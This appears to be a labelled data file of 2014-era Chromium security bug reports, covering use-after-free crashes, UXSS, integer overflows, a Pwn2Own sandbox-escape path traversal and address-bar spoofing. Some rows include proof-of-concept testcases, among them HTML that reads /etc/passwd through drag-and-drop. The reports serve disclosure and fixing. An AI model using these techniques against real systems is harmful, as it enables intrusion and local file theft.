security uxss via dispatchevent on iframes subject to some conditions vulnerability details permits a page on an arbitrary site to retrieve the document element of any target page given the following conditions the target page may be embedded in an iframe the target page has a handler for any window event the target page gets or sets any property of the event in the handler any jquery listener the target page returns a dom node from the handler the problem dispatchevent should complain when call'ed on iframe.contentwindow in child.html is a somewhat plausible example vulnerable site it relies on the automatic conversion of event handler return values to true/false to detect whether an action was taken for an event this is exploited by calling the event handler directly with a reference obtained from function.prototype.caller to obtain the dom node giving me access to document i personally was n't able to come up with an exploit without relying on the site returning a dom node in the event handler the final condition needs an additional test in blink/trunk/layouttests/http/tests/security/cross-frame-access-call.html for window.dispatchevent.call targetwindow new customevent click i do n't have the knowledge to suggest a code patch version chromium version 32.0.1700.102 ubuntu 12.10 32.0.1700.102-0ubuntu0.12.10.1~20140128.878.1 chrome version 32.0.1700.107 m windows 7 x64 sp1 reproduction case download parent.html and child.html put them on two different web servers and edit the iframe src in parent.html to point to the location of child.html i will assume that parent.html is at child.html is at open observe stolen stylesheet=ayti child_secret note that the child_secret cookie should be inaccessible from the parent page for crashes please include the following additional information n/a	9
security set_state global_handles renderer crash uaf with web workers and web sql vulnerability details chrome renderer crashes when a document is reloading triggered by the worker while the worker is using a web sql database at the same time version chrome version tot 34.0.1777.0 243865 asan/tot 34.0.1777.0 developer build 243816 operating system ubuntu 13.10 x64 i ca n't repro this on v31.0.1650.63 stable reproduction case launch the added repro file for crashes please include the following additional information type of crash renderer heap-use-after-free read of size 1 crash state see added asan trace	11
heap-use-after-free in ipc message header const pickle headert ipc message header detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc crash type heap-use-after-free read 8 crash address crash state crash stack ipc message header const pickle headert ipc message header content websocketdispatcherhost sendaddchannelresponse free stack ipc channel channelimpl resettoacceptingconnectionstate ipc channel channelimpl processoutgoingmessages regressed minimized testcase 4473.71 kb	11
pwn2own 3/13/2014 use-after-free in bindings pwnium 4 blink bug	11
pwn2own 3/13/2014 compromised renderers can set arbitrary clipboard formats this was used in the vupen exploit clipboardhostmsg_writeobjectsasync allows callers to pass in a clipboard objectmap of things to write one of the keys that a renderer can pass is cbf_data if the ipc handler sees that then it uses the renderer-supplied format type and writes the data to that format type on the clipboard	9
security junction point directory traversal vulnerability pwn2own 2014 it is a path traversal in the code that processes the databasehostmsg_openfile ipc message this message is designed to provide the renderer process with access to any file inside the database directory from src\webkit\browser\database\database_util.cpp base filepath databaseutil getfullfilepathforvfsfile databasetracker db_tracker const base string16 vfs_file_name std string origin_identifier base string16 database_name base string16 sqlite_suffix if crackvfsfilename vfs_file_name origin_identifier database_name sqlite_suffix return base filepath invalid vfs_file_name base filepath full_path db_tracker getfulldbfilepath origin_identifier database_name if full_path.empty sqlite_suffix.empty dcheck full_path.extension empty full_path full_path.insertbeforeextensionascii utf16toascii sqlite_suffix watch out for directory traversal attempts from a compromised renderer if full_path.value find file_path_literal base filepath stringtype npos return base filepath return full_path the function checks the path for a parent directory reference though it does not take into account the ntfs feature called junction point unlike symbolic links in windows administrator rights are not required to create a junction point and unlike hard links the source directory for a junction point is referenced by the handle instead of the path therefore if the renderer process has a handle to a directory opened in the write mode it is able to make the directory a junction point usually to obtain a handle to a directory one has to set the file_flag_backup_semantics flag in a createfile winapi call that is not possible with the databasehostmsg_openfile message instead the i30 index_allocation stream name the default directory stream is appended to the path it has the same effect as setting the flag so the exploit calls the webkitplatformsupportimpl databaseopenfile method to obtain a handle to a directory within the allowed path then uses the deviceiocontrol winapi function to make that directory a junction point to the root of the system partition	6
security integer overflow allocating shared memory in softwareframemanager swaptonewframe vulnerability details there may be an integer overflow allocating shared memory in softwareframemanager swaptonewframe const size_t size_in_bytes 4 frame_data size.getarea if shared_memory map size_in_bytes dlog error unable to map renderer memory recordaction base usermetricsaction badmessageterminate_sharedmemorymanager1 return false scoped_refptr softwareframe next_frame new softwareframe client output_surface_id frame_data id frame_device_scale_factor frame_data size shared_memory.pass current_frame_.swap next_frame in one call sequence the frame_data passed to softwareframemanager swaptonewframe is read from an ipc viewhostmsg_swapcompositorframe message renderwidgethostimpl onmessagereceived renderwidgethostimpl onswapcompositorframe renderwidgethostviewaura onswapcompositorframe renderwidgethostviewaura swapsoftwareframe softwareframemanager swaptonewframe if frame_data size.getarea is sufficiently large multiplication by 4 may trigger an overflow such that the mapped memory size is less than four times the number of pixels in this case it appears that an attempt may then be made to draw using memory outside of the allocated shared region also there appears to be a similar potential for an overflow in texturemailbox shared_memory_size_in_bytes size_t texturemailbox shared_memory_size_in_bytes const return 4 shared_memory_size_.getarea ps i am new to the chromium code base and to security work in general apologies if i ve made an error in this bug report version chrome version source git hash 785031dd5c78c21e345a2b5b8d698f42ba5ba00e with the attached patch applied to simulate a compromised renderer process operating system linux 3.2.0-54-virtual 82-ubuntu smp tue sep 10 20:31:18 utc 2013 x86_64 x86_64 x86_64 gnu/linux reproduction case the attached patch was applied to source git hash 785031dd5c78c21e345a2b5b8d698f42ba5ba00e to simulate a compromised renderer process sending a cooked viewhostmsg_swapcompositorframe message then chrome was compiled as a 64 bit asan build on starting chrome it terminated with the attached asan output	11
security uaf while deleting indexeddb databases from shared workers vulnerability details deleting a database from a worker while the same database is in use by another worker and the worker triggers a reload causes a uaf version chrome version 248869 tot/continuous asan operating system ubuntu 13.10 x64 reproduction case launch the added script for crashes please include the following additional information type of crash worker crash state see the trace below asan did not return detailed info 18840==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 20597==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome	11
heap-use-after-free in webcore htmlbodyelement insertedinto vulnerability details the following testcase crashes the current chrome asan build the vulnerable function node insertionnotificationrequest htmlbodyelement insertedinto containernode insertionpoint htmlelement insertedinto insertionpoint if insertionpoint indocument fixme it s surprising this is web compatible since it means a marginwidth and marginheight attribute can magically appear on the body of all documents embedded through iframe or frame element ownerelement document ownerelement if ishtmlframeelementbase ownerelement htmlframeelementbase ownerframeelement tohtmlframeelementbase ownerelement int marginwidth ownerframeelement.marginwidth if marginwidth 1 setintegralattribute marginwidthattr marginwidth int marginheight ownerframeelement.marginheight the ownerelement object is a raw pointer and can be garbage collected in the domsubtreemodified event which is fired in setintegralattribute the fix should be pretty straight forward make ownerelement a refptr reproduction case this testcase demonstrates the issue in a chrome asan build it requires the js-flags expose-gc command line argument script function start o2=document.createelement iframe document.body.appendchild o2 o2.setattribute marginwidth 1 o46=document.createelement body o46.addeventlistener domsubtreemodified cb_bodyspecial_13_1 o47=o2.contentdocument.documentelement o47.appendchild o46 function cb_bodyspecial_13_1 o2.parentnode.removechild o2 o2=null gc script body onload start body for crashes please include the following additional information type of crash tab crash state asan output attached	11
langfuzz crash with jump to invalid address useragent mozilla/5.0 x11 linux x86_64 rv:29.0 gecko/20100101 firefox/29.0 steps to reproduce the problem 1 load the following html file script function mjsunitassertionerror message this.stack new error stack function prettyprint value function fail expectedtext found name_opt var message fail ure throw new mjsunitassertionerror message assertequals function assertequals expected found name_opt fail prettyprint expected found name_opt assertthrows function assertthrows code type_opt cause_opt throw new mjsunitassertionerror did not throw exception var value function try assertequals 1 value catch exc1 function definesetter o function testfn f return 1 map f 0 try assertequals null testfn definesetter catch exc1 var str 1 for var i 0 i 100000 i str 1 str try assertthrows function json.parse str rangeerror catch exc1 script script var s for i 0 i 17592185913344 i s s i i+1 s s.substring s s 0.5 1 assertequals 57 s.charcodeat 0 script what is the expected behavior no crash what went wrong tab crash with jump to invalid address program received signal sigsegv segmentation fault in gdb x i pc can not access memory at address in the d8 shell i also get an invalid jump but to 31343 jump to the invalid address stated on the next line 31343 at 31343 by 31343 by 31343 by v8 internal invoke bool v8 internal handle v8 internal jsfunction v8 internal handle v8 internal object int v8 internal handle v8 internal object bool in v8-trunk/out/ia32.release/d8 did this work before n/a chrome version 35.0.1870.2 channel dev os version ubuntu 12.04 lts flash version shockwave flash 11.2 r202 this affects both 32 and 64 bit builds	11
heap-use-after-free in webcore renderinline willbedestroyed detailed report fuzzer miaubiz_css_fuzzer job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderinline willbedestroyed webcore renderobject destroy free stack webcore renderblock removechild webcore renderobject willbedestroyed regressed minimized testcase 0.96 kb	11
security unicode character can create phishing-friendly address bar vulnerability details inserting the unicode right-to-left override character in links allows attackers to construct omnibox displays that result in user confusion that could greatly aid in phishing version chrome version 32.0.1700.76 stable operating system windows 8.1 chrome version 31.0.1650.63 stable operating system ubuntu desktop linux 13.10 reproduction case html file to reproduce attached note that the issue is n't specific to href anchors using document.location from javascript will result in a similar end result without the user involvement of clicking a link screenshot of the end-result attached as well showing omnibox display and devtools to illustrate what is really being hit note that after the link is followed or the document.location is set the user is interacting with a page controlled by the attacker that could trivially be styled to look like the target site though is n't in this demo but on the address bar he or she appears to be on a different site chrome correctly renders font weights to differentiate the hostname from the path but this detail is unlikely to be noticed by an average user in the face of an otherwise correct looking url	9
security html files from file urls can read data from other file urls via drag-and-drop vulnerability details html files that were loaded from file urls are able to read other local files this works if the user can be tricked into performing a drag-and-drop interaction with the malicious file it seems that when a link to a file url that is located on a page from a file url is dragged chromium automatically grants the target of the drop event read access to the file version chrome version 33.0.1750.117 stable operating system debian wheezy reproduction case copy this code into a html file open the file in chromium perform a drag-and-drop action from dragme to here you should now see the contents of etc/passwd if you re on a linux system or so html a id b href file etc/passwd dragme a br br br br br br div id c ondragover event.preventdefault here div div id o div script document.getelementbyid c ondrop function e e.preventdefault var reader new filereader reader.onloadend function document.getelementbyid o innerhtml reader.result reader.readasbinarystring e.datatransfer.files 0 return false script html	5
security uaf in controller of color chooser version chrome version 34.0.1833.4 canary 32.0.1700.107 stable steps to repro 1 open index.htm 2 click on step 1 button then you can see navigate.htm is opened and click on step 2 3 in the end you ll see index.htm is crashed crash id 63ba5dbda0797f00 f08ea60e1a972619 for crashes please include the following additional information type of crash tab crash state eax=5fcb0066 ebx=00000000 ecx=04355d50 edx=5f34d8ff esi=043f1114 edi=0441e5a8 eip=20030000 esp=0019ef38 ebp=0019ef54 iopl=0 nv up ei pl nz na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010206 20030000 warning unable to verify checksum for chrome_child.dll 0:000 k stack trace for last set context thread/.cxr resets it childebp retaddr warning frame ip not in any known module following frames may be wrong 0019ef34 5f34d90e 0019ef3c 5e7f1fcf chrome_child blink colorchooserpopupuicontroller endchooser c b\build\slave\win-asan\build\src\third_party\webkit\source\web\colorchooserpopupuicontroller.cpp 74 0019ef48 5e7f1e6b chrome_child webcore colorinputtype colorinputtype c b\build\slave\win-asan\build\src\third_party\webkit\source\core\html\forms\colorinputtype.cpp 83 0019ef54 5e749544 chrome_child webcore colorinputtype scalar deleting destructor 0019ef68 5e7491eb chrome_child webcore htmlinputelement htmlinputelement c b\build\slave\win-asan\build\src\third_party\webkit\source\core\html\htmlinputelement.cpp 172 0019ef74 5e4a658e chrome_child webcore htmlinputelement scalar deleting destructor 0019ef98 5e4a2f45 chrome_child webcore removedetachedchildrenincontainer webcore node webcore containernode c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\containernodealgorithms.h 102 0019efa8 5e7a398b chrome_child webcore containernode containernode c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\containernode.cpp 99 0019efb4 5e49d0b3 chrome_child webcore htmlbrelement scalar deleting destructor 0019efc8 5e4a8aaa chrome_child wtf vectordestructor 1 wtf refptr webcore element destruct c b\build\slave\win-asan\build\src\third_party\webkit\source\wtf\vector.h 60 0019efd8 5e4a7711 chrome_child wtf vector wtf refptr webcore element 0 wtf defaultallocator shrinkcapacity c b\build\slave\win-asan\build\src\third_party\webkit\source\wtf\vector.h 934 0019efe0 5e48a089 chrome_child webcore fullscreenelementstack documentwasdisposed c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\fullscreenelementstack.cpp 130 0019f008 5e48d7e7 chrome_child webcore documentlifecyclenotifier notifydocumentwasdisposed c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\documentlifecyclenotifier.h 70 0019f024 5e47792a chrome_child webcore document dispose c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\document.cpp 621 0019f028 5e477e80 chrome_child webcore treescope removedlastreftoscope c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\node.cpp 2404 0019f030 5e83f1ac chrome_child webcore treeshared webcore node deref c b\build\slave\win-asan\build\src\third_party\webkit\source\core\dom\treeshared.h 81 0019f048 5e83f922 chrome_child webcore domwindow cleardocument c b\build\slave\win-asan\build\src\third_party\webkit\source\core\frame\domwindow.cpp 362 0019f058 5e83f11b chrome_child webcore domwindow domwindow c b\build\slave\win-asan\build\src\third_party\webkit\source\core\frame\domwindow.cpp 515 0019f064 5ed4a331 chrome_child webcore domwindow scalar deleting destructor 0019f074 5ebad711 chrome_child webcore v8idbdatabase derefobject c b\build\slave\win-asan\build\src\out\release\gen\blink\bindings\v8idbdatabase.cpp 478	11
unknown in v8 internal heapobject map_word detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8 crash type unknown crash address crash state crash stack v8 internal heapobject map_word v8 internal heapobject map v8 internal object isheapnumber minimized testcase 5.13 kb	11
check failure in check object map ismap failed src/heap-inl.h 833 detailed report fuzzer mbarbella_js_mutation job type linux_v8_d8_stress_deopt_compact crash type check failure crash address crash state crash stack check object map ismap failed src/heap-inl.h 817 minimized testcase 6.99 kb	11
check failure in check object map ismap failed src/heap-inl.h 818 detailed report fuzzer mbarbella_js_mutation job type linux_v8_d8_be crash type check failure crash address crash state crash stack check object map ismap failed src/heap-inl.h 818 minimized testcase 7.28 kb	11
use-of-uninitialized-memory in webcore renderstyle fontdescription may cause use-after-free or some such detailed report fuzzer inferno_layout_test_unmodified job type linux_asan_content_shell_drt crash type heap-use-after-free read 8 crash address crash state crash stack webcore renderstyle fontdescription webcore fontbuilder setfontsizevalue free stack ft_done_face open_face regressed minimized testcase 0.22 kb download div id target script target.animate fontsize small fontweight bold 1 if window.testrunner testrunner.dumpastext testrunner.waituntildone requestanimationframe function script	11
pwnium extension system allows compromised renderer access to crosh this needs further investigation but we have enough information to triage a pwnium 4 entry achieved a sandbox escape by sending messages from a compromised swapped out renderer to a vulnerable extension the problem seems to be in tabhelper which is getting state confused by the swap out creis synopsis tabhelper is not deleting state associated with a swapped out rvh it should probably be listening to webcontentsobserver renderviewhostchanged in addition to renderviewhostcreated and i m initially flagging this as high severity but maybe it should be lower	11
tracking bug for internal security fixes for chrome 34 release 0 high medium	11
origin confusion bug in quic the quicstreamfactory s session map is keyed off of hostportpair which does not include the scheme this means that if an attacker mitms an http url and suggests alternate-protocol 443 then chrome will make an insecure quic connection to 443 this session will then be available to be used by https urls doh	11
heap-use-after-free in printing printviewmanagerbase releaseprinterquery detailed report fuzzer ipc_fuzzer_gen job type linux_asan_chrome_ipc crash type heap-use-after-free read 4 crash address crash state crash stack printing printviewmanagerbase releaseprinterquery printing printviewmanagerbase onprintingfailed free stack std rb_tree void const std pair void const const linked_ptr base supportsuserdata data std rb_tree void const std pair void const const linked_ptr base supportsuserdata data minimized testcase 2175.31 kb	11
unknown in v8 internal map instance_descriptors detailed report fuzzer mbarbella_js_mutation_test job type linux_asan_d8 crash type unknown crash address crash state crash stack v8 internal map instance_descriptors v8 internal map generalizeallfieldrepresentations v8 internal slotrefvaluebuilder getnext minimized testcase 6.15 kb	11
untrusted synthetic gestures received in the browser are not verified inputhostmsg_queuesyntheticgesture messages received by renderwidgethostimpl can trigger a variety of gesture types including tap gestures on aura depending on the gesture parameters it s possible that these events are dispatched outside of the web contents i.e anywhere in the view system this is a security issue allowing an untrusted renderer to perform any number of compromising actions at the least we should use a command-line flag to allow synthetic gestures to be processed in the browser dropping them otherwise	11
heap-use-after-free in webcore replaceselectioncommand removeredundantstylesandkeepstylespaninline detailed report fuzzer inferno_twister_custom_bundle job type linux_asan_content_shell_drt crash type heap-use-after-free read 1 crash address crash state crash stack webcore replaceselectioncommand removeredundantstylesandkeepstylespaninline webcore replaceselectioncommand doapply free stack webcore elementdata elementdata webcore elementdata destroy regressed minimized testcase 0.71 kb	11
unknown in v8 internal heapobject map_word detailed report fuzzer mbarbella_js_mutation_test job type linux_asan_d8 crash type unknown crash address crash state crash stack v8 internal heapobject map_word v8 internal heapobject map v8 internal context isnativecontext minimized testcase 8.52 kb	11
unknown in int v8 internal flexiblebodyvisitor v8 internal newspacescavenger v8 internal jsobject bodyd detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8_v8_arm crash type unknown crash address crash state crash stack int v8 internal flexiblebodyvisitor v8 internal newspacescavenger v8 internal jsobject bodyd v8 internal heap doscavenge v8 internal heap scavenge minimized testcase 2.90 kb	11
security admin.google.com should have hsts preloaded it s currently opportunistic but should n't it be upgrade-always it s used to e.g manage cloud policy for fleets of mobile devices running chrome	11
unknown in v8 internal memorychunk heap detailed report fuzzer mbarbella_js_mutation job type linux_asan_d8 crash type unknown crash address crash state crash stack v8 internal memorychunk heap v8 internal heapobject getisolate v8 internal map generalizeallfieldrepresentations minimized testcase 7.02 kb	11
assertion failed object object islistbox unknown in webcore htmlselectelement listboxdefaulteventhandler vulnerability details select elements with a size property of more than one or with the multiple property set are rendered as a renderlistbox by the rendering layer htmlselectelement listboxdefaulteventhandler handles dispatched events for these objects when a mousedown event is fired on such an object the object is focussed and the process of re-rendering the object is started when focussing the object it is possible to return control to javascript via an event handler and modify the size or multiple properties of the element to force it to be rendered as a different type htmlselectelement listboxdefaulteventhandler checks that the renderer was not removed but it does not check that the object has the same renderer type as before the renderer for the element is then passed to call to torenderlistbox which triggers a bad cast a similar issue exists in htmlselectelement platformhandlekeydownevent and affects all platforms except windows which has it s own version of the function which is n't vulnerable the patches should be trivial so i ve assigned it to myself to work on version confirmed on stable 33.0.1750.146 on windows and linux also confirmed on a lkgr 35.0.1867.0 build on linux reproduction case a minimised testcase is attached with assertions enabled it triggers an assert_with_security_implication on the bad cast without no crash can be observed	9
security uaf in speechrecognitionbubbleimpl speechrecognitionbubbleimpl version chrome version 35.0.1892.2 canary operating system windows xp repro file input onclick settimeout test 500 x-webkit-speech script function test if document.documentelement.webkitrequestfullscreen document.documentelement.webkitrequestfullscreen document.addeventlistener webkitfullscreenchange function history.go 1 true script script defer=defer if history.length==1 settimeout window.location document.location new 10 script crash state 012fa78 02fa4583 chrome_1c50000 anonymous namespace speechrecognitionbubbleimpl speechrecognitionbubbleimpl c b\build\slave\win\build\src\chrome\browser\ui\views\speech_recognition_bubble_views.cc 362 0012fa84 025bc2a2 chrome_1c50000 anonymous namespace speechrecognitionbubbleimpl scalar deleting destructor 0012fac4 01cfdd91 chrome_1c50000 speech speechrecognitionbubblecontroller processrequestinuithread c b\build\slave\win\build\src\chrome\browser\speech\speech_recognition_bubble_controller.cc 199 0012fad4 01cb0f9c chrome_1c50000 base internal invoker 2 base internal bindstate base internal runnableadapter bool thiscall history shortcutsdatabase std basic_string char std char_traits char std allocator char const void cdecl history shortcutsdatabase std basic_string char std char_traits char std allocator char const void cdecl history shortcutsdatabase std basic_string char std char_traits char std allocator char void cdecl history shortcutsdatabase std basic_string char std char_traits char std allocator char const run c b\build\slave\win\build\src\base\bind_internal.h 1253 0012fb6c 01caff4d chrome_1c50000 base messageloop runtask c b\build\slave\win\build\src\base\message_loop\message_loop.cc 451 0012fcb0 01d2c55b chrome_1c50000 base messageloop dowork c b\build\slave\win\build\src\base\message_loop\message_loop.cc 576 0012fcdc 01cafa12 chrome_1c50000 base messagepumpforui dorunloop c b\build\slave\win\build\src\base\message_loop\message_pump_win.cc 219 0012fd84 01ecf92d chrome_1c50000 base messageloop starthistogrammer c b\build\slave\win\build\src\base\message_loop\message_loop.cc 545 0012fd98 01ecf8f5 chrome_1c50000 content browsermainloop runmainmessageloopparts c b\build\slave\win\build\src\content\browser\browser_main_loop.cc 723 0012fda8 01c705d4 chrome_1c50000 content browsermainrunnerimpl run c b\build\slave\win\build\src\content\browser\browser_main_runner.cc 118 0012fdd8 01c703bb chrome_1c50000 content browsermain c b\build\slave\win\build\src\content\browser\browser_main.cc 26 0012fdec 01c70337 chrome_1c50000 content runnamedprocesstypemain c b\build\slave\win\build\src\content\app\content_main_runner.cc 466 0012fe50 01c5c89a chrome_1c50000 content contentmainrunnerimpl run c b\build\slave\win\build\src\content\app\content_main_runner.cc 779 0012fe60 01c5c2d4 chrome_1c50000 content contentmain c b\build\slave\win\build\src\content\app\content_main.cc 19 0012fea0 00427c91 chrome_1c50000 chromemain c b\build\slave\win\build\src\chrome\app\chrome_main.cc 49 0012ff30 004276bc chrome maindllloader launch c b\build\slave\win\build\src\chrome\app\client_util.cc 315 0012ff74 00449ac5 chrome wwinmain c b\build\slave\win\build\src\chrome\app\chrome_exe_main_win.cc 103	11
sandbox codegen mergetails seccomp-bpf is unsound for single-successor basic blocks useragent mozilla/5.0 x11 linux x86_64 rv:30.0 gecko/20100101 firefox/30.0 steps to reproduce the problem context i m integrating the seccomp-bpf codegen into another project i do n't know if this issue affects how chromium itself currently uses these interfaces construct a filter program with two or more basic blocks consisting of the same non-jmp non-ret instruction i.e with the same opcode and k fields but different next pointers this will be the case if their successors are both the target of two or more branches more generally two otherwise identical basic blocks ending with such instructions should also work what is the expected behavior the mergetails pass will not merge the basic blocks unless their successors are extensionally equivalent in particular pointercompare called on the two basic blocks should return what it would have returned if called on their successors this is what would have happened if the basic blocks had ended with unnecessary bpf_ja instructions to the same destinations what went wrong pointercompare returns 0 mergetails replaces the pointers and the meaning of the program is changed in particular this can introduce a cycle into the program causing a crash when attempting to compile it this is how i became aware of it in principle it could also depending on the original filter produce a bpf program which allows system calls that should have been prevented did this work before n/a chrome version 799ae3bd3edd1801fee3dcf721269fa0864067f7 channel n/a os version n/a flash version n/a the attached patch seems to work but i have n't run the unit tests yet the example is entirely untested it was extracted from a deliberately deoptimized for testing purposes real filter which was affected	7
heap-use-after-free in webcore speechsynthesisutterance starttime detailed report fuzzer inferno_twister job type linux_asan_chrome_v8 crash type heap-use-after-free read 8 crash address crash state crash stack webcore speechsynthesisutterance starttime webcore speechsynthesis fireevent free stack webcore speechsynthesis handlespeakingcompleted webcore webspeechsynthesizerclientimpl speakingerroroccurred regressed minimized testcase 4.83 kb	11
check failure in check size_in_bytes kmaxblocksize failed src/spaces.cc 2378 detailed report fuzzer mbarbella_js_mutation job type linux_v8_d8_be crash type check failure crash address crash state crash stack check size_in_bytes kmaxblocksize failed src/spaces.cc 2378 minimized testcase 5.63 kb	11
assertion failed actualinfo derefobjectfunction wrappertypeinfo.derefobjectfunction unknown in webcore v8htmlelement createwrapper detailed report fuzzer inferno_twister_custom_bundle job type linux_asan_chrome_v8_arm crash type unknown crash address crash state crash stack webcore v8htmlelement createwrapper webcore createv8htmldirectwrapper webcore customelementwrapper webcore htmlelement webcore v8htmlelement wrap minimized testcase 18.71 kb	11
security uaf/crash in websockets onsentdata/reset with web and shared workers combined vulnerability details the repro script causes a browser crash/uaf because shared and web worker combined cause chrome to access already freed websocket related objects after the window/tab has been closed automatically version chrome version 33.0.1750.152 stable 35.0.1916.0 260135 tot operating system ubuntu 13.10 x64 reproduction case 1 start chrome with at least 2 tabs one will also do but the script will then close the browser 2 run the repro script in one of them for crashes please include the following additional information type of crash browser crash state see added asan trace	11
security integer overflows in characterdata deletedata characterdata replacedata vulnerability details both characterdata deletedata and characterdata replacedata do not properly check for integer overflows this is shown in the following code from deletedata where offset and count are both user-specified values unsigned realcount if offset count length realcount length offset else realcount count document didremovetext this offset realcount didremovetext eventually calls range didremovetext which updates the start and end offsets of the range with the invalid values very similar code is also present in replacedata the patches should be trivial so i ve assigned it to myself to work on version confirmed on stable 33.0.1750.146 on windows and linux also confirmed on a lkgr 35.0.1867.0 build on linux reproduction case a minimised testcase is attached with assertions enabled it triggers an assertion without assertions enabled it does n't crash and the endoffset property of the range object can be observed to be above the length of the underlying text	11
heap-use-after-free in webcore renderobject childat vulnerability details the following testcase crashes the current asan build reproduction case script function start try o0=tmp=document.createelement iframe catch e try document.body.appendchild tmp catch e try o3=document.getelementbyid fuzz_div catch e try o10=document.documentelement catch e try o24=document.createelementns catch e try o10.appendchild o24 catch e try o26=o24.contentdocument catch e window.settimeout window.start_scriptiframe0 100 function start_scriptiframe0 try o31=o0.contentdocument catch e try o32=o31.documentelement catch e try o35=o24.contentwindow.document catch e try o3.appendchild o32 catch e try o74=document.createelementns catch e try o32.appendchild o74 catch e try o76=window.getselection catch e try o76.selectallchildren o74 catch e try o80=document.createelementns catch e try o3.appendchild o80 catch e try o3.contenteditable=true catch e try document.execcommand selectall false null catch e try document.execcommand createlink false url file catch e try o122=tmp=o3.ownerdocument.createelement iframe catch e try o123=tmp catch e try o35.write element1 catch e try document.execcommand undo false null catch e try o196=o26.documentelement catch e try o196.appendchild o80 catch e try o80.appendchild o123 catch e try o301=o122.ownerdocument catch e try o301.execcommand redo false null catch e try o301.execcommand insertorderedlist false null catch e script body onload start div id fuzz_div div body for crashes please include the following additional information type of crash tab crash state asan output attached in debug.txt	11
security use after free in styleengine createsheet vulnerability details the testcase below crashes the latest asan chrome build reproduction case script function start o0=document.createelement iframe o1=document.createelement iframe document.body.appendchild o1 o4=document.createelement iframe document.body.appendchild o4 o6=document.documentelement o48=document.createelement style o48.innerhtml blockquote tr td shape-rendering auto o136=window.getselection o136.selectallchildren o6 o137=o136.getrangeat 0 o163=document.body o54=o4.contentwindow.document o0.src='javascript window.top.cb_scriptsrc_48_1 o70=document.createelementns o6.appendchild o70 o79=o54.createrange o79.selectnodecontents o4 o108=document o124=o70.contentwindow.document o294=o1.contentwindow.document o108.open o0.appendchild o6 o6.appendchild o48 o6.appendchild o163 o327=o294.createelement object o79.surroundcontents o327 o327.appendchild o0 function cb_scriptsrc_48_1 o48.nextsibling.appendchild o48.firstchild o79.deletecontents o124.documentelement.appendchild o0 o137.insertnode o6 script body onload start body for crashes please include the following additional information type of crash tab crash state asan output attached in debug.txt	11
security integer overflow allocating shared memory in audioinputrendererhost oncreatestream vulnerability details i believe a potential buffer write overflow may occur in the browser process due to an integer overflow condition when allocating shared memory in audioinputrendererhost oncreatestream the shared memory in entry shared_memory is allocated with size segment_size entry shared_memory_segment_count bytes the variables used in this multiplication are both 32 bit integers that are individually calculated from values provided by the renderer in an audioinputhostmsg_createstream_config message on a multiplication integer overflow the size of the shared memory allocation may be less than expected by audioinputsyncwriter write possibly even less than the segment size as a result when audioinputsyncwriter write attempts to write a segment to the shared memory buffer a write overflow may occur as a demonstration i have written a patch simulating a compromised renderer process sending cooked values in an audioinputhostmsg_createstream_config message the result is a segment_size of 131074 a entry shared_memory_segment_count of 32768 and a shared memory allocation of 65536 this results in a write of 131058 bytes in audioinputsyncwriter write at an offset from the base address of the 65536 byte shared memory region which is a write overflow the source patch and asan output from a test run are attached the bytes written to the overflow memory region will generally come from audio samples i believe an attacker might exercise some control over the content of these bytes by manipulating audio recording parameters and the offset of the memory location for the overflow so that any predictable values in the audio samples might be written to a desired location a somewhat more remote possibility is that an attacker might attempt to exercise some measure of control over the content of the audio samples by playing specific tones from the computer speaker while the recording is taking place note that i have not experimentally checked the feasibility of either of these methods version chrome version git source hash 0760c783b421753c2bbeba410d9051c37f728f61 with the attached patch applied for descriptive logging and to simulate a compromised renderer process 64 bit asan release build operating system os x 10.9.1 13b42 note that i believe this issue may be present on other operating systems and in 32 bit compilations as well reproduction case the attached patch was applied to git source hash 0760c783b421753c2bbeba410d9051c37f728f61 and compiled into a 64 bit asan release binary the provided audio.html file was served from localhost port 8000 using python m simplehttpserver chrome was started as follows out/release/chromium.app/contents/macos/chromium out.log after chrome was started allow was clicked to permit use of the microphone by the audio.html page after this the asan chrome build terminated with the heap buffer overflow reported in the attached asan log	11
heap-use-after-free in webcore svgfontfaceelement associatedfontelement tested on os ubuntu 12.04 chromium asan 35.0.1851.0 developer build 252405 aura repro-file xml version 1.0 encoding utf-8 standalone no svg id svg-root xmlns width 100 height 100 viewbox 0 0 480 360 baseprofile basic version 1.1 xmlns xlink defs discard font id font1 horiz-adv-x 5121 font-face mathematical 327681 ideographic 2 font-weight bold descent 100.999999999999999999999999999999999999999999999999999999 cap-height 11 hanging 1 units-per-em 8 alphabetic 32769 x-height 128 font-family happysad ascent 255 font altglyphdef id ysmile altglyphdef defs g stroke-width 32 font-size 10241 font-family happysad fill none text y 190 x 2147483648 stroke fuchsia altglyph xlink href hsmile h altglyph altglyph xlink href asmile a altglyph text g svg asan-trace 7086==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 chrome 0 in webcore svgfontfaceelement associatedfontelement const b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/svg/svgfontfaceelement.cpp:266:0 1 in webcore svgfontandfontfaceelementforfontdata webcore simplefontdata const webcore svgfontfaceelement webcore svgfontelement b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/svg/svgtextrunrenderingcontext.cpp:52:0 2 in webcore svgtextrunrenderingcontext glyphdataforcharacter webcore font const webcore textrun const webcore widthiterator int bool int unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/core/rendering/svg/svgtextrunrenderingcontext.cpp:215:42 3 in webcore widthiterator glyphdataforcharacter int bool int unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/fonts/widthiterator.cpp:79:0 4 in unsigned int webcore widthiterator advanceinternal webcore latin1textiterator webcore latin1textiterator webcore glyphbuffer b/build/slave/asan_release__symbolized_/build/src/out/release third_party/webkit/source/platform/fonts/widthiterator.cpp:163:0 5 in webcore widthiterator advance int webcore glyphbuffer 